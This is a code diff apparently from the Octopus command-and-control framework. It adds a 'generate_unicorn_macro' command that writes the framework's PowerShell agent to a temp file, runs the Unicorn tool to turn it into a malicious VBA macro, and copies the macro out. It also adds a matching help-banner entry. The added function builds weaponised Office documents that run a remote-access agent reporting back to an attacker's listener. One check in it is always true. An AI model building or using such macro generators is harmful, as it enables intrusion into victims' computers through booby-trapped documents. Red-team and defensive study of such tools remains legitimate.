@@ -10,6 +10,7 @@ import random
 import string
 from .encryption import *
 from profile import *
+from config import *
 import time
 import os
 import socket
@@ -35,7 +36,7 @@ oct_commands = [
     "listen_https", "delete", "generate_powershell", "generate_unmanaged_exe",
     "generate_hta", "generate_macro", "generate_digispark", "delete_listener",
     "generate_spoofed_args_exe", "generate_x86_shellcode",
-    "generate_x64_shellcode"
+    "generate_x64_shellcode", "generate_unicorn_macro"
     ]
 
 
@@ -67,6 +68,51 @@ def check_listener_name(listener_name):
 	else:
 		return True
 
+def check_unicorn():
+    if os.path.isfile(unicorn_path):
+        command = "python3 %s" % unicorn_path
+        results = os.popen(command).read()
+        if "Magic Unicorn Attack Vector" in results:
+            return True
+        else:
+            return False
+    else:
+        return False
+
+
+def generate_unicorn_macro(hostname, path, interval, proto_to_use, vba_path):
+    if check_unicorn():
+        print(colored("[+] unicorn path seems good!", "green"))
+        # generate octopus powershell agent
+        f = open("agents/agent.ps1.oct")
+        template = f.read()
+        pcode = replace_agent_config_vars(template, proto_to_use, hostname, interval)
+
+        # save octopus powershell agent
+        c = random.choice(string.ascii_lowercase)
+        tmp_file_code_path = "/tmp/octopus-agent-%s.ps1" % c
+        f2 = open(tmp_file_code_path, "w")
+        f2.write(pcode)
+        f.close()
+
+        # generate vba using unicorn
+        command = "python3 %s %s macro 500" % (unicorn_path, tmp_file_code_path)
+        result = os.popen(command).read()
+        if "Exported powershell output code to powershell_attack.txt":
+            # copy macro to dest
+            unicorn_abs_path = os.path.abspath(unicorn_path+"/..")
+            unicorn_output_path = unicorn_abs_path + "/powershell_attack.txt"
+            copy_command = "cp %s %s" % (unicorn_output_path, vba_path)
+            copy_result = os.popen(copy_command).read()
+            if copy_result == '':
+                 print((colored("[+] macro generated successfully !", "green")))
+                 print((colored("[+] macro file saved to {0}".format(vba_path), "red")))
+
+
+    else:
+        print(colored("[-] unicorn is not installed or wrong binary selected", "red"))
+        print(colored("[*] please check config.py file"))
+        exit()
 
 def check_listener_port(host, port):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -436,6 +482,7 @@ def main_help_banner():
     print("* generate_x86_shellcode \t\tgenerate 32-bit shellcode the run Octopus agent via CreateProcessA")
     print("* generate_x64_shellcode \t\tgenerate 64-bit shellcode the run Octopus agent via CreateProcessA")
     print("* generate_macro \t\t\tgenerate VBA macro")
+    print("* generate_unicorn_macro \t\tgenerate VBA macro based on unicorn")
     print("* listen_http  \t\t\t\tto start a HTTP listener")
     print("* listen_https  \t\t\tto start a HTTPS listener")
     print("interact {session}  \t\t\tto interact with a session")
